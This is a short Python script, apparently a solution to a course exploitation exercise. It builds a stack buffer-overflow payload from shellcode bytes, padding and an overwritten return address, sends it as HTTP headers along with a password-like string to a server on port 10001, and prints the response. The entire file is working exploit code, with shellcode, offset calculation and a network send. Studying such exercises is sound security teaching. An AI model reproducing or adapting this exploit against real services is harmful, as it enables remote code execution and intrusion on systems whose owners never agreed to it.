import socket
import random

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')
    
# Method should always be get
METHOD = b"GET/HTTP/1.1"

PORT = 10001
# We don't care what URL we're grabbing; they all have the possibility of exploit...
URL = b"/"

CODE = b"\x48\xc7\xc0\x0b\x32\x40\x00\xff\xd0\x48\x89\xc7\
\x48\xc7\xc0\x7d\x2f\x40\x00\xff\xd0"

# Figure out how many bytes we need to pad until we get to the return address 
# on the stack. (Hint: It's not 10...) it's the length of the buffer from stage1 
# minus our code
N = 1008 - len(CODE)
PADDING = b"\xff" * N

# Fill this in with the address you actually want instead of `0xdeadbeef`
#ADDRESS OF GARBAGE
ADDRESS = to_bytes(0x58585590)

# The "exploit string" is what we send in as the headers
HEADERS = CODE + PADDING + ADDRESS

# The functions we call will often look in the request's data for a password.
# So, we send it here.
DATA = b"d83887129a"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request =  METHOD + b" " + URL + b"\r\n" + HEADERS + b"\r\n\r\n" + DATA
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
